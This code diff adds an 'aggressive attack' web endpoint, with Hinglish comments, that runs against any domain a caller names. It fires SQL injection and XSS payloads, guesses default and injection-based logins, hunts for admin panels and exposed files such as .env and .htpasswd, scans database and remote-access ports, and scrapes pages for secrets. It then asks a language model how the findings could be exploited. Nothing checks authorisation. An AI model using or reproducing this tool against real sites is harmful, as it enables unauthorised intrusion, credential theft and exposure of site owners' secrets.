@@ -1168,3 +1168,154 @@ Bypassed: {chr(10).join(results['bypassed'][:5])}"""
         "ai_summary": ai_summary,
         "response_time": f"{round(time.time()-start, 2)}s"
     }
+
+@app.get("/aggressiveattack")
+def aggressive_attack(domain: str, key: str = Depends(verify_key)):
+    import urllib.request
+    start = time.time()
+    domain = domain.replace("https://","").replace("http://","").split("/")[0]
+    url = "https://" + domain
+    results = {"critical": [], "warnings": [], "safe": [], "data_found": []}
+
+    # 1. SQL Injection - Actually try karo
+    sql_payloads = ["'", "''", "' OR '1'='1", "admin'--", "1' OR '1'='1'--"]
+    sql_errors = ["sql", "mysql", "sqlite", "syntax error", "warning", "fatal", "unclosed", "odbc", "jdbc"]
+    for payload in sql_payloads:
+        for param in ["id", "user", "username", "search", "q", "page", "cat"]:
+            test_url = f"{url}?{param}={payload}"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+                res = urllib.request.urlopen(req, timeout=5)
+                body = res.read(5000).decode("utf-8", errors="ignore").lower()
+                found = [e for e in sql_errors if e in body]
+                if found:
+                    results["critical"].append(f"SQL INJECTION FOUND! param={param} payload={payload} errors={found}")
+                    break
+            except Exception as ex:
+                err = str(ex).lower()
+                found = [e for e in sql_errors if e in err]
+                if found:
+                    results["critical"].append(f"SQL INJECTION! param={param} payload={payload}")
+
+    # 2. XSS - Actually try karo
+    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'><script>alert(1)</script>"]
+    for payload in xss_payloads:
+        for param in ["q", "search", "query", "name", "comment", "msg", "text", "input"]:
+            test_url = f"{url}?{param}={payload}"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+                res = urllib.request.urlopen(req, timeout=5)
+                body = res.read(3000).decode("utf-8", errors="ignore")
+                if payload in body:
+                    results["critical"].append(f"XSS FOUND! param={param} payload={payload}")
+                    break
+            except:
+                pass
+
+    # 3. Admin panels dhundho
+    admin_paths = ["/admin", "/admin/login", "/wp-admin", "/administrator", "/login", "/dashboard", "/cpanel", "/phpmyadmin", "/manager", "/backend", "/control", "/admin.php", "/login.php"]
+    for path in admin_paths:
+        try:
+            req = urllib.request.Request(url + path, headers={"User-Agent": "Mozilla/5.0"})
+            res = urllib.request.urlopen(req, timeout=3)
+            if res.status == 200:
+                results["critical"].append(f"ADMIN PANEL FOUND: {path} (Status: 200)")
+        except Exception as ex:
+            if "403" in str(ex):
+                results["warnings"].append(f"Admin path exists but blocked: {path}")
+
+    # 4. Sensitive files
+    sensitive = [".env", ".git/config", "wp-config.php", "config.php", "backup.sql", ".htpasswd", "credentials.json", "database.yml", "settings.py", "composer.json"]
+    for f in sensitive:
+        try:
+            req = urllib.request.Request(f"{url}/{f}", headers={"User-Agent": "Mozilla/5.0"})
+            res = urllib.request.urlopen(req, timeout=3)
+            if res.status == 200:
+                content_peek = res.read(200).decode("utf-8", errors="ignore")
+                results["critical"].append(f"EXPOSED FILE: /{f} Content: {content_peek[:100]}")
+        except Exception as ex:
+            if "403" in str(ex):
+                results["warnings"].append(f"/{f} exists but blocked")
+
+    # 5. Open ports - risky check
+    risky = {21:"FTP",22:"SSH",23:"Telnet",3306:"MySQL",3389:"RDP",6379:"Redis",27017:"MongoDB",5432:"PostgreSQL"}
+    try:
+        ip = socket.gethostbyname(domain)
+        for port, service in risky.items():
+            s = socket.socket()
+            s.settimeout(1)
+            if s.connect_ex((ip, port)) == 0:
+                results["critical"].append(f"RISKY PORT OPEN: {port} ({service})")
+            s.close()
+    except:
+        pass
+
+    # 6. Login bypass try karo
+    login_paths = ["/login", "/admin/login", "/wp-login.php", "/signin", "/user/login"]
+    bypass_payloads = [
+        {"username": "admin", "password": "admin"},
+        {"username": "admin", "password": "password"},
+        {"username": "admin", "password": "123456"},
+        {"username": "root", "password": "root"},
+        {"username": "admin'--", "password": "anything"},
+        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
+    ]
+    for path in login_paths:
+        for creds in bypass_payloads:
+            try:
+                import json as _json
+                data = _json.dumps(creds).encode()
+                req = urllib.request.Request(url + path, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})
+                res = urllib.request.urlopen(req, timeout=3)
+                body = res.read(500).decode("utf-8", errors="ignore").lower()
+                if any(x in body for x in ["dashboard", "welcome", "logout", "profile", "token", "success"]):
+                    results["critical"].append(f"LOGIN BYPASS! path={path} creds={creds}")
+            except:
+                pass
+
+    # 7. Subdomains interesting
+    for sub in ["admin", "api", "dev", "test", "staging", "backup", "db", "database", "secret", "internal"]:
+        try:
+            ip2 = socket.gethostbyname(f"{sub}.{domain}")
+            results["warnings"].append(f"Interesting subdomain: {sub}.{domain} ({ip2})")
+        except:
+            pass
+
+    # 8. Data leak check - response mein sensitive info
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        res = urllib.request.urlopen(req, timeout=8)
+        body = res.read(10000).decode("utf-8", errors="ignore")
+        leak_patterns = ["password", "passwd", "secret", "api_key", "apikey", "token", "private_key", "aws_", "database_url", "db_pass"]
+        for pattern in leak_patterns:
+            if pattern in body.lower():
+                idx = body.lower().find(pattern)
+                snippet = body[max(0,idx-20):idx+60]
+                results["data_found"].append(f"SENSITIVE DATA in page: ...{snippet}...")
+    except:
+        pass
+
+    # AI Analysis
+    summary = f"Domain: {domain}\nCritical: {len(results[chr(99)+chr(114)+chr(105)+chr(116)+chr(105)+chr(99)+chr(97)+chr(108)])}\nWarnings: {len(results[chr(119)+chr(97)+chr(114)+chr(110)+chr(105)+chr(110)+chr(103)+chr(115)])}\nData Leaks: {len(results[chr(100)+chr(97)+chr(116)+chr(97)+chr(95)+chr(102)+chr(111)+chr(117)+chr(110)+chr(100)])}\nFindings:\n" + "\n".join((results["critical"] + results["warnings"] + results["data_found"])[:15])
+
+    try:
+        ai_resp = client.chat.completions.create(
+            model="llama-3.3-70b-versatile",
+            messages=[{"role": "user", "content": f"Security attack results:\n{summary}\n\nHinglish mein bolo: kya critical vulnerabilities mili? Kaise exploit kiya ja sakta hai? Top fixes kya hain? Direct aur short bolo."}],
+            max_tokens=400
+        )
+        ai_analysis = ai_resp.choices[0].message.content.strip()
+    except:
+        ai_analysis = "AI analysis failed"
+
+    return {
+        "domain": domain,
+        "critical_count": len(results["critical"]),
+        "warning_count": len(results["warnings"]),
+        "data_leaks": len(results["data_found"]),
+        "critical": results["critical"],
+        "warnings": results["warnings"],
+        "data_found": results["data_found"],
+        "ai_analysis": ai_analysis,
+        "response_time": f"{round(time.time()-start, 2)}s"
+    }
